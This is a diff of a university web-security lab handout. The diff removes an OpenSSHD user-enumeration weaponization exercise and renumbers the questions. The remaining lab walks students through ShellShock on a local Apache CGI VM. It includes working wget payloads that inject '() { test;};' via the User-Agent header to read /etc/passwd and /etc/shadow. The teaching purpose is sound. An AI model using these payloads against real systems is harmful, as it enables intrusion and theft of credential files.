@@ -1,44 +1,10 @@
 # Web Server Vulnerabilities #
 
-This time we are going to look at some of vulnerabilities of Web servers. We will be covering two vulnerabilities: the ShellShock vulnerability from 2014 and a  OpenSSHD vulnerability from 2016.
+This time we are going to look at some of vulnerabilities of Web servers. We will be covering the ShellShock vulnerability from 2014.
 
-# Part 1: OpenSSHD Weaponization #
+# Part 1: VirtualBox Setup
 
-In 2016, OpenSSHD had a vulnerability that could allow a remote user to enumerate users on a SSHD running system. We will take a proof of concept of the vulnerability and weaponize it.
-
-First, Go to the CERT Coordination Center: [http://cert.org/](http://cert.org/)
-
-**Question 1** What is the purpose of the CERT Coordination Center?
-
-**Question 2** What is a CVE?
-
-Now, this OpenSSHD vulnerability has a CVE of CVE-2016-6210. You can find more details about this vulnerability by visiting [https://www.exploit-db.com/exploits/40113/](https://www.exploit-db.com/exploits/40113/ "here").
-
-
-**Question 3** Based on the link, how is OpenSSHD vulnerable?
-
-This website provides a short snippet of Python code demonstrating how this vulnerability could be exploited. Your goal is to weaponize this vulnerability by integrating the sample code into the provided `template.py` wrapper.
-
-We have set up a vulnerable server for you to test with. The server you will attempt to log into is found at `TBD`. Once you have integrated the sample into the template, you can run it with the following:
-
-> python opensshd.py [-h] [-u --userlist USERLIST_FILE] target_ip
-
-Create a user list text file and fill it with potential usernames. Your goal is to try and find out whether some users exist on this server. Feel free to run the script a couple of times to get a better sense of the results. Try populating your user list with the following users (one per line):
-
-| user    |
-|---------|
-| user1   |
-| user2   |
-| user3   |
-| user4   |
-
-**Question 4** Copy your script's results into your report. Based on the results, which users do you think exist on this server?
-
-**Question 5** How does knowing potential user accounts on the server compromise its security?
-
-# Part 2: VirtualBox Setup
-
-For the remainder of this lab, you will run a VirtualBox virtual machine that you can fully configure as a superuser. I have prepared one for you.
+For this lab you will run a VirtualBox virtual machine that you can fully configure as a superuser. I have prepared one for you.
 
 Each of the lab machines has access to a shared directory at `/seng/seng360/`. Look for the `vm` folder. In it, you should see three files named `seng360bare.*` and a `Logs` folder. This is the base VM image you will be **copying** from.
 
@@ -88,21 +54,27 @@ To become root in the virtual machine you will need to use the command `su` (use
 | user | user360 | user360    |
 | root | root    | root360lab |
 
-# Part 3: The ShellShock Bug #
+# Part 2: The ShellShock Bug #
 
 You may have heard of the ShellShock bug from 2014. You can read up on it [here](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29).
 
-**Question 6** What are the CVEs that relate to the ShellShock bug?
+Go to the CERT Coordination Center: [http://cert.org/](http://cert.org/)
+
+**Question 1** What is the purpose of the CERT Coordination Center?
+
+**Question 2** What is a CVE?
+
+**Question 3** What are the CVEs that relate to the ShellShock bug?
 
 Find and read Vulnerability Note [VU#252743](http://www.kb.cert.org/vuls/id/252743). This note will point you to a RedHat blog where the bug is described.
 
-**Question 7** What are the tests for the vulnerabilities in each of the main two CVEs?
+**Question 4** What are the tests for the vulnerabilities in each of the main two CVEs?
 
-Given your answer to **Question 7**, try the two tests to check if `bash` is vulnerable (it is).
+Given your answer to **Question 4**, try the two tests to check if `bash` is vulnerable (it is).
 
-# Part 4: Apache Setup #
+# Part 3: Apache Setup #
 
-Your virtual machine is already running Apache on port 80 (port 3080 for this host machine). Apache configuration files are located in the VM at `/etc/apache2`
+Your virtual machine is already running Apache on port 80 (port 3080 for this host machine). Apache configuration files are located at `/etc/apache2`
 
 ## Enable cgi ##
 
@@ -144,17 +116,17 @@ echo "End of the world"
 
 Test it at [http://localhost:3080/cgi-bin/test.bash](http://localhost:3080/cgi-bin/test.bash).
 
-**Question 8** What user is the one executing the scripts? (see the output of whoami above). Why does apache use that user?
+**Question 5** What user is the one executing the scripts? (see the output of whoami above). Why does apache use that user?
 
 ## /etc/passwd and /etc/shadow ##
 
-Quickly skim the man page of shadow (`man shadow`). Inspect the files `/etc/passwd` and `/etc/shadow`
+Read the man page of shadow (`man shadow`). Inspect the files `/etc/passwd` and `/etc/shadow`
 
-**Question 9** Why does Linux maintain `/etc/shadow`?
+**Question 6** Why does Linux maintain `/etc/shadow`?
 
-**Question 10** What is the difference between `/etc/passwd` and `/etc/shadow`?
+**Question 7** What is the difference between `/etc/passwd` and `/etc/shadow`?
 
-# Part 5: ShellShock Attack #
+# Part 4: ShellShock Attack #
 
 Now we can try the attack.
 
@@ -168,7 +140,7 @@ wget -O ~/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; ec
 
 Test it. What do you get in `output.txt`?
 
-**Question 11** Given your knowledge of the vulnerability, explain how the attack works.
+**Question 8** Given your knowledge of the vulnerability, explain how the attack works.
 
 Try it again.
 
@@ -176,9 +148,9 @@ Try it again.
 wget -O ~/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/shadow" http://localhost:3080/cgi-bin/test.bash
 ```
 
-**Question 12** Explain why this attack didn't work.
+**Question 9** Explain why this attack didn't work.
 
-**Question 13** What is the vulnerability in the /etc/passwd attack?
+**Question 10** What is the vulnerability in the /etc/passwd attack?
 
 - Try modifying your wget script attack to try other commands. Try to execute, for example `ls -lR /etc` or `ls -lR /home/`.
 
@@ -194,4 +166,4 @@ From Wikipedia:
 
 You will be submitting one file:
 
-- `report.txt` Your answers to the 13 questions
+- `report.txt` Your answers to the 10 questions
